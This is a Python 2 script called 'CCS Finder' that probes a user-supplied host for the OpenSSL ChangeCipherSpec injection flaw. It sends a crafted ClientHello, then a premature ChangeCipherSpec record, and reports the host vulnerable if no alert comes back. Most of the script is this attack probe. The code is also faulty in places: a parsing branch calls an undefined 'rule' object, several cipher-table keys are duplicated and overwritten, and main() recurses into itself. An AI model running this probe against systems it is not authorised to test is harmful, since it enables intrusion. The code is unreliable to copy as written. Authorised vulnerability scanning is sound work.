#!/usr/bin/python

import os,sys,socket,struct,time

def Banner():
	print '''
   ___   ___  __     ___ _           _           
  / __\ / __\/ _\   / __(_)_ __   __| | ___ _ __ 
 / /   / /   \ \   / _\ | | '_ \ / _` |/ _ \ '__|
/ /___/ /___ _\ \ / /   | | | | | (_| |  __/ |   
\____/\____/ \__/ \/    |_|_| |_|\__,_|\___|_|   
                                                 
	Author: Muhammad Adeel aka Stoker
	Mail: 	Chaudhary1337@gmail.com
	Blog: 	UrduSecurity.blogspot.com\n\n'''

Banner()

Host = raw_input('Enter Target Host: ')
Port = input('Enter Target Port [443] : ')

Var1 = {
    "SSL (v3)"   : "\x03\x00",
    "TLS (v1)" 	 : "\x03\x01",
    "TLS (v1.1)" : "\x03\x02",
    "TLS (v1.2)" : "\x03\x03",
}

Cipher_List = dict()
Cipher_List['\x00\x1a'] = "TLS_DH_anon_WITH_DES_CBC_SHA"
Cipher_List['\x00\x1b'] = "TLS_DH_anon_WITH_3DES_EDE_CBC_SHA"
Cipher_List['\x00\x1c'] = "SSL_FORTEZZA_KEA_WITH_NULL_SHA"
Cipher_List['\x00\x1d'] = "SSL_FORTEZZA_KEA_WITH_FORTEZZA_CBC_SHA"
Cipher_List['\x00\x1e'] = "SSL_FORTEZZA_KEA_WITH_RC4_128_SHA"
Cipher_List['\x00\x1E'] = "TLS_KRB5_WITH_DES_CBC_SHA"
Cipher_List['\x00\x1F'] = "TLS_KRB5_WITH_3DES_EDE_CBC_SHA"
Cipher_List['\x00\x20'] = "TLS_KRB5_WITH_RC4_128_SHA"
Cipher_List['\x00\x21'] = "TLS_KRB5_WITH_IDEA_CBC_SHA"
Cipher_List['\x00\x22'] = "TLS_KRB5_WITH_DES_CBC_MD5"
Cipher_List['\x00\x23'] = "TLS_KRB5_WITH_3DES_EDE_CBC_MD5"
Cipher_List['\x00\x24'] = "TLS_KRB5_WITH_RC4_128_MD5"
Cipher_List['\x00\x25'] = "TLS_KRB5_WITH_IDEA_CBC_MD5"
Cipher_List['\x00\x26'] = "TLS_KRB5_EXPORT_WITH_DES_CBC_40_SHA"
Cipher_List['\x00\x27'] = "TLS_KRB5_EXPORT_WITH_RC2_CBC_40_SHA"
Cipher_List['\x00\x28'] = "TLS_KRB5_EXPORT_WITH_RC4_40_SHA"
Cipher_List['\x00\x29'] = "TLS_KRB5_EXPORT_WITH_DES_CBC_40_MD5"
Cipher_List['\x00\x2A'] = "TLS_KRB5_EXPORT_WITH_RC2_CBC_40_MD5"
Cipher_List['\x00\x2B'] = "TLS_KRB5_EXPORT_WITH_RC4_40_MD5"
Cipher_List['\x00\x2C'] = "TLS_PSK_WITH_NULL_SHA"
Cipher_List['\x00\x2D'] = "TLS_DHE_PSK_WITH_NULL_SHA"
Cipher_List['\x00\x2E'] = "TLS_RSA_PSK_WITH_NULL_SHA"
Cipher_List['\x00\x2F'] = "TLS_RSA_WITH_AES_128_CBC_SHA"
Cipher_List['\x00\x30'] = "TLS_DH_DSS_WITH_AES_128_CBC_SHA"
Cipher_List['\x00\x31'] = "TLS_DH_RSA_WITH_AES_128_CBC_SHA"
Cipher_List['\x00\x32'] = "TLS_DHE_DSS_WITH_AES_128_CBC_SHA"
Cipher_List['\x00\x33'] = "TLS_DHE_RSA_WITH_AES_128_CBC_SHA"
Cipher_List['\x00\x34'] = "TLS_DH_anon_WITH_AES_128_CBC_SHA"
Cipher_List['\x00\x35'] = "TLS_RSA_WITH_AES_256_CBC_SHA"
Cipher_List['\x00\x36'] = "TLS_DH_DSS_WITH_AES_256_CBC_SHA"
Cipher_List['\x00\x37'] = "TLS_DH_RSA_WITH_AES_256_CBC_SHA"
Cipher_List['\x00\x38'] = "TLS_DHE_DSS_WITH_AES_256_CBC_SHA"
Cipher_List['\x00\x39'] = "TLS_DHE_RSA_WITH_AES_256_CBC_SHA"
Cipher_List['\x00\x3A'] = "TLS_DH_anon_WITH_AES_256_CBC_SHA"
Cipher_List['\x00\x3B'] = "TLS_RSA_WITH_NULL_SHA256"
Cipher_List['\x00\x3C'] = "TLS_RSA_WITH_AES_128_CBC_SHA256"
Cipher_List['\x00\x3D'] = "TLS_RSA_WITH_AES_256_CBC_SHA256"
Cipher_List['\x00\x3E'] = "TLS_DH_DSS_WITH_AES_128_CBC_SHA256"
Cipher_List['\x00\x3F'] = "TLS_DH_RSA_WITH_AES_128_CBC_SHA256"
Cipher_List['\x00\x40'] = "TLS_DHE_DSS_WITH_AES_128_CBC_SHA256"
Cipher_List['\x00\x41'] = "TLS_RSA_WITH_CAMELLIA_128_CBC_SHA"
Cipher_List['\x00\x42'] = "TLS_DH_DSS_WITH_CAMELLIA_128_CBC_SHA"
Cipher_List['\x00\x43'] = "TLS_DH_RSA_WITH_CAMELLIA_128_CBC_SHA"
Cipher_List['\x00\x44'] = "TLS_DHE_DSS_WITH_CAMELLIA_128_CBC_SHA"
Cipher_List['\x00\x45'] = "TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA"
Cipher_List['\x00\x46'] = "TLS_DH_anon_WITH_CAMELLIA_128_CBC_SHA"
Cipher_List['\x00\x60'] = "TLS_RSA_EXPORT1024_WITH_RC4_56_MD5"
Cipher_List['\x00\x61'] = "TLS_RSA_EXPORT1024_WITH_RC2_CBC_56_MD5"
Cipher_List['\x00\x62'] = "TLS_RSA_EXPORT1024_WITH_DES_CBC_SHA"
Cipher_List['\x00\x63'] = "TLS_DHE_DSS_EXPORT1024_WITH_DES_CBC_SHA"
Cipher_List['\x00\x64'] = "TLS_RSA_EXPORT1024_WITH_RC4_56_SHA"
Cipher_List['\x00\x65'] = "TLS_DHE_DSS_EXPORT1024_WITH_RC4_56_SHA"
Cipher_List['\x00\x66'] = "TLS_DHE_DSS_WITH_RC4_128_SHA"
Cipher_List['\x00\x67'] = "TLS_DHE_RSA_WITH_AES_128_CBC_SHA256"
Cipher_List['\x00\x68'] = "TLS_DH_DSS_WITH_AES_256_CBC_SHA256"
Cipher_List['\x00\x69'] = "TLS_DH_RSA_WITH_AES_256_CBC_SHA256"
Cipher_List['\x00\x6A'] = "TLS_DHE_DSS_WITH_AES_256_CBC_SHA256"
Cipher_List['\x00\x6B'] = "TLS_DHE_RSA_WITH_AES_256_CBC_SHA256"
Cipher_List['\x00\x6C'] = "TLS_DH_anon_WITH_AES_128_CBC_SHA256"
Cipher_List['\x00\x6D'] = "TLS_DH_anon_WITH_AES_256_CBC_SHA256"
Cipher_List['\x00\x80'] = "TLS_GOSTR341094_WITH_28147_CNT_IMIT"
Cipher_List['\x00\x81'] = "TLS_GOSTR341001_WITH_28147_CNT_IMIT"
Cipher_List['\x00\x82'] = "TLS_GOSTR341094_WITH_NULL_GOSTR3411"
Cipher_List['\x00\x83'] = "TLS_GOSTR341001_WITH_NULL_GOSTR3411"
Cipher_List['\x00\x84'] = "TLS_RSA_WITH_CAMELLIA_256_CBC_SHA"
Cipher_List['\x00\x85'] = "TLS_DH_DSS_WITH_CAMELLIA_256_CBC_SHA"
Cipher_List['\x00\x86'] = "TLS_DH_RSA_WITH_CAMELLIA_256_CBC_SHA"
Cipher_List['\x00\x87'] = "TLS_DHE_DSS_WITH_CAMELLIA_256_CBC_SHA"
Cipher_List['\x00\x88'] = "TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA"
Cipher_List['\x00\x89'] = "TLS_DH_anon_WITH_CAMELLIA_256_CBC_SHA"
Cipher_List['\x00\x8A'] = "TLS_PSK_WITH_RC4_128_SHA"
Cipher_List['\x00\x8B'] = "TLS_PSK_WITH_3DES_EDE_CBC_SHA"
Cipher_List['\x00\x8C'] = "TLS_PSK_WITH_AES_128_CBC_SHA"
Cipher_List['\x00\x8D'] = "TLS_PSK_WITH_AES_256_CBC_SHA"
Cipher_List['\x00\x8E'] = "TLS_DHE_PSK_WITH_RC4_128_SHA"
Cipher_List['\x00\x8F'] = "TLS_DHE_PSK_WITH_3DES_EDE_CBC_SHA"
Cipher_List['\x00\x90'] = "TLS_DHE_PSK_WITH_AES_128_CBC_SHA"
Cipher_List['\x00\x91'] = "TLS_DHE_PSK_WITH_AES_256_CBC_SHA"
Cipher_List['\x00\x92'] = "TLS_RSA_PSK_WITH_RC4_128_SHA"
Cipher_List['\x00\x93'] = "TLS_RSA_PSK_WITH_3DES_EDE_CBC_SHA"
Cipher_List['\x00\x94'] = "TLS_RSA_PSK_WITH_AES_128_CBC_SHA"
Cipher_List['\x00\x95'] = "TLS_RSA_PSK_WITH_AES_256_CBC_SHA"
Cipher_List['\x00\x96'] = "TLS_RSA_WITH_SEED_CBC_SHA"
Cipher_List['\x00\x97'] = "TLS_DH_DSS_WITH_SEED_CBC_SHA"
Cipher_List['\x00\x98'] = "TLS_DH_RSA_WITH_SEED_CBC_SHA"
Cipher_List['\x00\x99'] = "TLS_DHE_DSS_WITH_SEED_CBC_SHA"
Cipher_List['\x00\x9A'] = "TLS_DHE_RSA_WITH_SEED_CBC_SHA"
Cipher_List['\x00\x9B'] = "TLS_DH_anon_WITH_SEED_CBC_SHA"
Cipher_List['\x00\x9C'] = "TLS_RSA_WITH_AES_128_GCM_SHA256"
Cipher_List['\x00\x9D'] = "TLS_RSA_WITH_AES_256_GCM_SHA384"
Cipher_List['\x00\x9E'] = "TLS_DHE_RSA_WITH_AES_128_GCM_SHA256"
Cipher_List['\x00\x9F'] = "TLS_DHE_RSA_WITH_AES_256_GCM_SHA384"
Cipher_List['\x00\xA0'] = "TLS_DH_RSA_WITH_AES_128_GCM_SHA256"
Cipher_List['\x00\xA1'] = "TLS_DH_RSA_WITH_AES_256_GCM_SHA384"
Cipher_List['\x00\xA2'] = "TLS_DHE_DSS_WITH_AES_128_GCM_SHA256"
Cipher_List['\x00\xA3'] = "TLS_DHE_DSS_WITH_AES_256_GCM_SHA384"
Cipher_List['\x00\xA4'] = "TLS_DH_DSS_WITH_AES_128_GCM_SHA256"
Cipher_List['\x00\xA5'] = "TLS_DH_DSS_WITH_AES_256_GCM_SHA384"
Cipher_List['\x00\xA6'] = "TLS_DH_anon_WITH_AES_128_GCM_SHA256"
Cipher_List['\x00\xA7'] = "TLS_DH_anon_WITH_AES_256_GCM_SHA384"
Cipher_List['\x00\xA8'] = "TLS_PSK_WITH_AES_128_GCM_SHA256"
Cipher_List['\x00\xA9'] = "TLS_PSK_WITH_AES_256_GCM_SHA384"
Cipher_List['\x00\xAA'] = "TLS_DHE_PSK_WITH_AES_128_GCM_SHA256"
Cipher_List['\x00\xAB'] = "TLS_DHE_PSK_WITH_AES_256_GCM_SHA384"
Cipher_List['\x00\xAC'] = "TLS_RSA_PSK_WITH_AES_128_GCM_SHA256"
Cipher_List['\x00\xAD'] = "TLS_RSA_PSK_WITH_AES_256_GCM_SHA384"
Cipher_List['\x00\xAE'] = "TLS_PSK_WITH_AES_128_CBC_SHA256"
Cipher_List['\x00\xAF'] = "TLS_PSK_WITH_AES_256_CBC_SHA384"
Cipher_List['\x00\xB0'] = "TLS_PSK_WITH_NULL_SHA256"
Cipher_List['\x00\xB1'] = "TLS_PSK_WITH_NULL_SHA384"
Cipher_List['\x00\xB2'] = "TLS_DHE_PSK_WITH_AES_128_CBC_SHA256"
Cipher_List['\x00\xB3'] = "TLS_DHE_PSK_WITH_AES_256_CBC_SHA384"
Cipher_List['\x00\xB4'] = "TLS_DHE_PSK_WITH_NULL_SHA256"
Cipher_List['\x00\xB5'] = "TLS_DHE_PSK_WITH_NULL_SHA384"
Cipher_List['\x00\xB6'] = "TLS_RSA_PSK_WITH_AES_128_CBC_SHA256"
Cipher_List['\x00\xB7'] = "TLS_RSA_PSK_WITH_AES_256_CBC_SHA384"
Cipher_List['\x00\xB8'] = "TLS_RSA_PSK_WITH_NULL_SHA256"
Cipher_List['\x00\xB9'] = "TLS_RSA_PSK_WITH_NULL_SHA384"
Cipher_List['\x00\xBA'] = "TLS_RSA_WITH_CAMELLIA_128_CBC_SHA256"
Cipher_List['\x00\xBB'] = "TLS_DH_DSS_WITH_CAMELLIA_128_CBC_SHA256"
Cipher_List['\x00\xBC'] = "TLS_DH_RSA_WITH_CAMELLIA_128_CBC_SHA256"
Cipher_List['\x00\xBD'] = "TLS_DHE_DSS_WITH_CAMELLIA_128_CBC_SHA256"
Cipher_List['\x00\xBE'] = "TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA256"
Cipher_List['\x00\xBF'] = "TLS_DH_anon_WITH_CAMELLIA_128_CBC_SHA256"
Cipher_List['\x00\xC0'] = "TLS_RSA_WITH_CAMELLIA_256_CBC_SHA256"
Cipher_List['\x00\xC1'] = "TLS_DH_DSS_WITH_CAMELLIA_256_CBC_SHA256"
Cipher_List['\x00\xC2'] = "TLS_DH_RSA_WITH_CAMELLIA_256_CBC_SHA256"
Cipher_List['\x00\xC3'] = "TLS_DHE_DSS_WITH_CAMELLIA_256_CBC_SHA256"
Cipher_List['\x00\xC4'] = "TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA256"
Cipher_List['\x00\xC5'] = "TLS_DH_anon_WITH_CAMELLIA_256_CBC_SHA256"
Cipher_List['\x00\x00'] = "TLS_EMPTY_RENEGOTIATION_INFO_SCSV"
Cipher_List['\xc0\x01'] = "TLS_ECDH_ECDSA_WITH_NULL_SHA"
Cipher_List['\xc0\x02'] = "TLS_ECDH_ECDSA_WITH_RC4_128_SHA"
Cipher_List['\xc0\x03'] = "TLS_ECDH_ECDSA_WITH_3DES_EDE_CBC_SHA"
Cipher_List['\xc0\x04'] = "TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA"
Cipher_List['\xc0\x05'] = "TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA"
Cipher_List['\xc0\x06'] = "TLS_ECDHE_ECDSA_WITH_NULL_SHA"
Cipher_List['\xc0\x07'] = "TLS_ECDHE_ECDSA_WITH_RC4_128_SHA"
Cipher_List['\xc0\x08'] = "TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA"
Cipher_List['\xc0\x09'] = "TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA"
Cipher_List['\xc0\x0a'] = "TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA"
Cipher_List['\xc0\x0b'] = "TLS_ECDH_RSA_WITH_NULL_SHA"
Cipher_List['\xc0\x0c'] = "TLS_ECDH_RSA_WITH_RC4_128_SHA"
Cipher_List['\xc0\x0d'] = "TLS_ECDH_RSA_WITH_3DES_EDE_CBC_SHA"
Cipher_List['\xc0\x0e'] = "TLS_ECDH_RSA_WITH_AES_128_CBC_SHA"
Cipher_List['\xc0\x0f'] = "TLS_ECDH_RSA_WITH_AES_256_CBC_SHA"
Cipher_List['\xc0\x10'] = "TLS_ECDHE_RSA_WITH_NULL_SHA"
Cipher_List['\xc0\x11'] = "TLS_ECDHE_RSA_WITH_RC4_128_SHA"
Cipher_List['\xc0\x12'] = "TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA"
Cipher_List['\xc0\x13'] = "TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA"
Cipher_List['\xc0\x14'] = "TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA"
Cipher_List['\xc0\x15'] = "TLS_ECDH_anon_WITH_NULL_SHA"
Cipher_List['\xc0\x16'] = "TLS_ECDH_anon_WITH_RC4_128_SHA"
Cipher_List['\xc0\x17'] = "TLS_ECDH_anon_WITH_3DES_EDE_CBC_SHA"
Cipher_List['\xc0\x18'] = "TLS_ECDH_anon_WITH_AES_128_CBC_SHA"
Cipher_List['\xc0\x19'] = "TLS_ECDH_anon_WITH_AES_256_CBC_SHA"
Cipher_List['\xC0\x1A'] = "TLS_SRP_SHA_WITH_3DES_EDE_CBC_SHA"
Cipher_List['\xC0\x1B'] = "TLS_SRP_SHA_RSA_WITH_3DES_EDE_CBC_SHA"
Cipher_List['\xC0\x1C'] = "TLS_SRP_SHA_DSS_WITH_3DES_EDE_CBC_SHA"
Cipher_List['\xC0\x1D'] = "TLS_SRP_SHA_WITH_AES_128_CBC_SHA"
Cipher_List['\xC0\x1E'] = "TLS_SRP_SHA_RSA_WITH_AES_128_CBC_SHA"
Cipher_List['\xC0\x1F'] = "TLS_SRP_SHA_DSS_WITH_AES_128_CBC_SHA"
Cipher_List['\xC0\x20'] = "TLS_SRP_SHA_WITH_AES_256_CBC_SHA"
Cipher_List['\xC0\x21'] = "TLS_SRP_SHA_RSA_WITH_AES_256_CBC_SHA"
Cipher_List['\xC0\x22'] = "TLS_SRP_SHA_DSS_WITH_AES_256_CBC_SHA"
Cipher_List['\xC0\x23'] = "TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256"
Cipher_List['\xC0\x24'] = "TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384"
Cipher_List['\xC0\x25'] = "TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA256"
Cipher_List['\xC0\x26'] = "TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA384"
Cipher_List['\xC0\x27'] = "TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256"
Cipher_List['\xC0\x28'] = "TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384"
Cipher_List['\xC0\x29'] = "TLS_ECDH_RSA_WITH_AES_128_CBC_SHA256"
Cipher_List['\xC0\x2A'] = "TLS_ECDH_RSA_WITH_AES_256_CBC_SHA384"
Cipher_List['\xC0\x2B'] = "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256"
Cipher_List['\xC0\x2C'] = "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384"
Cipher_List['\xC0\x2D'] = "TLS_ECDH_ECDSA_WITH_AES_128_GCM_SHA256"
Cipher_List['\xC0\x2E'] = "TLS_ECDH_ECDSA_WITH_AES_256_GCM_SHA384"
Cipher_List['\xC0\x2F'] = "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256"
Cipher_List['\xC0\x30'] = "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384"
Cipher_List['\xC0\x31'] = "TLS_ECDH_RSA_WITH_AES_128_GCM_SHA256"
Cipher_List['\xC0\x32'] = "TLS_ECDH_RSA_WITH_AES_256_GCM_SHA384"
Cipher_List['\xC0\x33'] = "TLS_ECDHE_PSK_WITH_RC4_128_SHA"
Cipher_List['\xC0\x34'] = "TLS_ECDHE_PSK_WITH_3DES_EDE_CBC_SHA"
Cipher_List['\xC0\x35'] = "TLS_ECDHE_PSK_WITH_AES_128_CBC_SHA"
Cipher_List['\xC0\x36'] = "TLS_ECDHE_PSK_WITH_AES_256_CBC_SHA"
Cipher_List['\xC0\x37'] = "TLS_ECDHE_PSK_WITH_AES_128_CBC_SHA256"
Cipher_List['\xC0\x38'] = "TLS_ECDHE_PSK_WITH_AES_256_CBC_SHA384"
Cipher_List['\xC0\x39'] = "TLS_ECDHE_PSK_WITH_NULL_SHA"
Cipher_List['\xC0\x3A'] = "TLS_ECDHE_PSK_WITH_NULL_SHA256"
Cipher_List['\xC0\x3B'] = "TLS_ECDHE_PSK_WITH_NULL_SHA384"
Cipher_List['\xfe\xfe'] = "SSL_RSA_FIPS_WITH_DES_CBC_SHA"
Cipher_List['\xfe\xff'] = "SSL_RSA_FIPS_WITH_3DES_EDE_CBC_SHA"
Cipher_List['\xff\xe0'] = "SSL_RSA_FIPS_WITH_3DES_EDE_CBC_SHA"
Cipher_List['\xff\xe1'] = "SSL_RSA_FIPS_WITH_DES_CBC_SHA"
Cipher_List['\x00\x00'] = "TLS_NULL_WITH_NULL_NULL"
Cipher_List['\x00\x01'] = "TLS_RSA_WITH_NULL_MD5"
Cipher_List['\x00\x02'] = "TLS_RSA_WITH_NULL_SHA"
Cipher_List['\x00\x03'] = "TLS_RSA_EXPORT_WITH_RC4_40_MD5"
Cipher_List['\x00\x04'] = "TLS_RSA_WITH_RC4_128_MD5"
Cipher_List['\x00\x05'] = "TLS_RSA_WITH_RC4_128_SHA"
Cipher_List['\x00\x06'] = "TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5"
Cipher_List['\x00\x07'] = "TLS_RSA_WITH_IDEA_CBC_SHA"
Cipher_List['\x00\x08'] = "TLS_RSA_EXPORT_WITH_DES40_CBC_SHA"
Cipher_List['\x00\x09'] = "TLS_RSA_WITH_DES_CBC_SHA"
Cipher_List['\x00\x0a'] = "TLS_RSA_WITH_3DES_EDE_CBC_SHA"
Cipher_List['\x00\x0b'] = "TLS_DH_DSS_EXPORT_WITH_DES40_CBC_SHA"
Cipher_List['\x00\x0c'] = "TLS_DH_DSS_WITH_DES_CBC_SHA"
Cipher_List['\x00\x0d'] = "TLS_DH_DSS_WITH_3DES_EDE_CBC_SHA"
Cipher_List['\x00\x0e'] = "TLS_DH_RSA_EXPORT_WITH_DES40_CBC_SHA"
Cipher_List['\x00\x0f'] = "TLS_DH_RSA_WITH_DES_CBC_SHA"
Cipher_List['\x00\x10'] = "TLS_DH_RSA_WITH_3DES_EDE_CBC_SHA"
Cipher_List['\x00\x11'] = "TLS_DHE_DSS_EXPORT_WITH_DES40_CBC_SHA"
Cipher_List['\x00\x12'] = "TLS_DHE_DSS_WITH_DES_CBC_SHA"
Cipher_List['\x00\x13'] = "TLS_DHE_DSS_WITH_3DES_EDE_CBC_SHA"
Cipher_List['\x00\x14'] = "TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA"
Cipher_List['\x00\x15'] = "TLS_DHE_RSA_WITH_DES_CBC_SHA"
Cipher_List['\x00\x16'] = "TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA"
Cipher_List['\x00\x17'] = "TLS_DH_anon_EXPORT_WITH_RC4_40_MD5"
Cipher_List['\x00\x18'] = "TLS_DH_anon_WITH_RC4_128_MD5"
Cipher_List['\x00\x19'] = "TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA"

def Previous_Record(strBuf):
    Found_Records = []
    if len(strBuf)>=9:
        sslStatus = struct.unpack('>BHHI', strBuf[0:9])
        SSL_Yype = (sslStatus[3] & (0xFF000000))>>24
        Check_Length  = sslStatus[3] & (0x00FFFFFF)
        Check_Protocol = sslStatus[0]
        SSL_Length = sslStatus[2]
        if (Check_Length + 5 < SSL_Length):
            Found_Records.append((Check_Protocol,SSL_Yype))
            Stop_Loop = 0
            OffSet_Value = Check_Length + 9
            while OffSet_Value < len(strBuf):
                Stop_Loop += 1
                CSS_Count = 0
                while ((OffSet_Value+4) > len(strBuf) and CSS_Count < 5):
                    CSS_Count += 1
                    rule.waitForData()
                    if len(rule.buffer) > 0:
                        strBuf += rule.buffer
                if ((OffSet_Value+4) > len(strBuf)):
                    break
                SSL_YypeAndLen = struct.unpack(">I",strBuf[OffSet_Value:OffSet_Value+4])[0]
                Check_Length = SSL_YypeAndLen & (0x00FFFFFF)
                SSL_Yype = (SSL_YypeAndLen & (0xFF000000))>>24
                Found_Records.append((Check_Protocol,SSL_Yype))
                OffSet_Value += (Check_Length + 4)
                if Stop_Loop > 8:
                    break
            return Found_Records
        elif (Check_Length + 9 < len(strBuf)):
            #log(2,"Multiple Records")
            Found_Records.append((Check_Protocol,SSL_Yype))
            OffSet_Value = Check_Length + 9
            Stop_Loop = 0
            while OffSet_Value+6 < len(strBuf):
                Stop_Loop += 1
                Check_Protocol = struct.unpack(">B",strBuf[OffSet_Value])[0]
                Check_Length = struct.unpack(">H",strBuf[OffSet_Value+3:OffSet_Value+5])[0]
                SSL_Yype = struct.unpack(">B",strBuf[OffSet_Value+5])[0]
                Found_Records.append((Check_Protocol,SSL_Yype))
                OffSet_Value += Check_Length + 5
                if Stop_Loop > 8:
                    break
            return Found_Records
        elif (Check_Length + 9 == len(strBuf)):
            sslStatus = Header_SSL(strBuf)
            Found_Records.append((sslStatus[0],sslStatus[2]))
            return Found_Records
    return None        
    
def Header_SSL(strBuf):
    if len(strBuf)>=6:
        sslStatus = struct.unpack('>BHHI', strBuf[0:9])
        SSL_Yype = (sslStatus[3] & (0xFF000000))>>24
        Check_Length  = sslStatus[3] & (0x00FFFFFF)
        Check_Protocol = sslStatus[0]
        SSL_Length = sslStatus[2]        
        return (Check_Protocol,SSL_Length,SSL_Yype,Check_Length)
    return None

def Payload_Generation(SSL_Version_Values):
    r = "\x16"
    r += Var1[SSL_Version_Values]
    Ciph3rss = "" 
    for c in Cipher_List.keys():
        Ciph3rss += c
    dLen = 43 + len(Ciph3rss)
    r += struct.pack("!H",dLen)
    h = "\x01"
    strPlen = struct.pack("!L",dLen-4)
    h+=strPlen[1:]
    h+= Var1[SSL_Version_Values]
    Rand0m = struct.pack("!L", int(time.time()))
    Rand0m += "\x36\x24\x34\x16\x27\x09\x22\x07\xd7\xbe\xef\x69\xa1\xb2"
    Rand0m += "\x37\x23\x14\x96\x27\xa9\x12\x04\xe7\xce\xff\xd9\xae\xbb"
    h+=Rand0m
    h+= "\x00" # No Session ID
    h+=struct.pack("!H",len(Ciph3rss))
    h+=Ciph3rss
    h+= "\x01\x00"
    return r+h

CCS_Vulnerabilitied = 0
for SSL_Version_Check in ["TLS (v1.2)","TLS (v1.1)","TLS (v1)","SSL (v3)"]:
    Hell0_Text = Payload_Generation(SSL_Version_Check)
    Handshake_Log = "[%s] %s:%d" % (SSL_Version_Check,Host,Port)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((Host,Port))
        s.settimeout(5)
    except:
        print "[!] %s:%d Host is Down." % (Host,Port)
        quit()
    s.send(Hell0_Text)
    CSS_Count = 0
    Hello_World = False
    Certificate = False
    fKex = False
    fHelloDone = False
    while CSS_Count<5:
        CSS_Count += 1
        try:
            recv = s.recv(2048)
        except:
            continue
        Found_Records = Previous_Record(recv)
        if Found_Records != None and len(Found_Records) > 0:
            for (Check_Protocol,SSL_Yype) in Found_Records:
                if Check_Protocol == 22:
                    if SSL_Yype == 2:
                        Hello_World = True
                    elif SSL_Yype == 11:
                        Certificate = True
                    elif SSL_Yype == 12:
                        fKex = True
                    elif SSL_Yype == 14:
                        fHelloDone = True
            if (Hello_World and Certificate):
                break
        else:
            continue
    if not (Hello_World and Certificate):
        print "[!] %s Handshake Error!" % (Handshake_Log)
    elif len(recv)>0:
        if ord(recv[0])==22:
            CSS_Count = 0
            CCS_StRing = "\x14"
            CCS_StRing += Var1[SSL_Version_Check]
            CCS_StRing += "\x00\x01"
            CCS_StRing += "\x01"
            s.send(CCS_StRing)
            Vulner = True
            Last_Text = ""
            while CSS_Count < 5:
                CSS_Count += 1
                s.settimeout(0.5)
                try:
                    recv = s.recv(2048)
                except socket.timeout:
                    continue
                if (len(recv)>0):
                    Last_Text = recv
                    if (ord(recv[0])==21):
                        Vulner = False
                        break
            try:
                if ord(Last_Text[-7]) == 21:
                    Vulner=False
            except IndexError:
                pass
            if Vulner:
                print "[!] Version [%s]\n=> %s:%d Is Vulnerable to CCS Injection! " % (SSL_Version_Check,Host,Port)
                CCS_Vulnerabilitied += 1
            else:
                print "[!] Version [%s]\n=> %s:%d Not Accepting Payload." % (SSL_Version_Check,Host,Port)
    else:
        print "[!] Version [%s]\n=>  No response from %s:%d !" % (SSL_Version_Check,Host,Port)
    try:
        s.close()
    except:
        pass
if CCS_Vulnerabilitied > 0:
    print "\n[!] This Host is Highly Vulnerable to CCS Injection. \nThanks For Using CCS Finder.\n\n=> http://urdusecurity.blogspot.com"
    Banner()
    quit(1)
else:
    print "\n[!] This Host is NOT Vulnerable to CCS Injection. \nThanks For Using CCS Finder.\n\n=> http://urdusecurity.blogspot.com"
    Banner()
    quit(0)

def main():
	Banner()
	if __name__ == '__main__':
		main()
	
